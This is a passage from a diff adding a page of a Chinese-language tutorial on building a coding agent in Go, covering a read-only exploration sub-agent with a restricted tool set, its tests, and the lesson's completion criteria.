+<span class="w">        </span><span class="nx">tools</span><span class="p">:</span><span class="w"> </span><span class="kt">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">bool</span><span class="p">{</span><span class="s">"read"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="s">"grep"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="s">"bash"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="s">"finish"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">},</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">sub</span><span class="p">.</span><span class="nx">Start</span><span class="p">(</span><span class="nx">ws</span><span class="p">.</span><span class="nx">Root</span><span class="p">,</span><span class="w"> </span><span class="nx">Settings</span><span class="p">{</span><span class="nx">Approval</span><span class="p">:</span><span class="w"> </span><span class="s">"never"</span><span class="p">,</span><span class="w"> </span><span class="nx">Writable</span><span class="p">:</span><span class="w"> </span><span class="s">"（只读）"</span><span class="p">});</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">""</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">sub</span><span class="p">.</span><span class="nx">Turn</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="s">"只读调查以下问题，完成后用 finish 给出简洁结论：\n"</span><span class="o">+</span><span class="nx">q</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>Agent</code> 增加一个可选的 <code>tools</code> 集合：<code>toolNames()</code> 只返回集合里的名字，<code>call</code> 开头检查不在集合里就返回“没有工具”。主 agent 的 <code>call</code> 增加：</p>
+<div class="hl"><pre><span></span><code><span class="k">case</span><span class="w"> </span><span class="s">"explore"</span><span class="p">:</span>
+<span class="w">    </span><span class="nx">out</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Explore</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Model</span><span class="p">,</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">WS</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">.</span><span class="nx">Question</span><span class="p">)</span>
+</code></pre></div>
+
+<p>测试时主 agent 和子代理用两个不同的脚本模型（或者一个模型根据 <code>req.Input[0]</code> 的内容区分）。验证：主 agent 的 <code>Input()</code> 在 explore 前后只多了一条 assistant（含调用）和一条 tool（摘要）；子代理的请求记录里有 3 次 read 和 2 次 grep；子代理脚本里放一个 <code>edit</code> 调用，它的工具结果是“没有工具”。</p>
+<p>注意子代理共享了同一个 <code>Workspace</code>，所以它的 <code>read</code> 也会更新已读状态，主 agent 之后可以直接编辑子代理读过的文件。如果不想这样（主 agent 自己没看过内容），给子代理一个新的 <code>Workspace</code> 实例指向同一个目录即可。</p>
+<hr />
+<h2 id="完成标准">完成标准</h2>
+<ul>
+<li><code>make test</code> 全部通过（15 个测试），<code>go test -race</code> 通过；</li>
+<li>练习 1 的三个问题能讲清楚，尤其是 deny 为什么必须最先检查；</li>
+<li>练习 2 的编辑后诊断写完，能解释为什么语法错误拒绝、类型错误只提示；</li>
+<li>能画出 Codex 一次请求的 input 结构，说出 AGENTS.md 的加载顺序和上限；</li>
+<li>能复述 SWE-agent 消融里至少三个结论，并说明 mini-swe-agent 的反转意味着什么；</li>
+<li>自测题 10 道能不看答案讲出来，尤其是第 2、5、7、8 题。</li>
+</ul>
+    <nav class="pager"><a class="prev" href="03-05-agent-state.html"><span>← 上一课 3.5</span>Agent 状态与数据模型：事件溯源与完整重放</a></nav>
+    <p class="foot">© 2026 duang777 · 课件源文件：<a href="https://github.com/Duang777/ai-agent-fullstack-roadmap/blob/main/notes/03-agents/06-coding-agent.md">notes/03-agents/06-coding-agent.md</a></p>
+  </article>
+</div>
+<script>
+document.getElementById("theme-toggle").addEventListener("click",function(){var r=document.documentElement,n=r.getAttribute("data-theme")==="light"?"dark":"light";r.setAttribute("data-theme",n);try{localStorage.setItem("x-theme",n)}catch(e){}});
+document.querySelectorAll('article pre').forEach(function(pre){
+  var b=document.createElement('button');b.className='code__copy';b.textContent='复制';
+  b.onclick=function(){navigator.clipboard.writeText(pre.innerText).then(function(){b.textContent='已复制';setTimeout(function(){b.textContent='复制'},1200)})};
+  pre.parentNode.insertBefore(b,pre);
+});
+var links=[].slice.call(document.querySelectorAll('.toc a')),map={};
+links.forEach(function(a){map[decodeURIComponent(a.getAttribute('href').slice(1))]=a});
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting&&map[e.target.id]){links.forEach(function(l){l.classList.remove('on')});map[e.target.id].classList.add('on')}})},{rootMargin:'-80px 0px -70% 0px'});
+document.querySelectorAll('article h1[id],article h2[id]').forEach(function(h){io.observe(h)});
+</script>
+</body>
+</html>
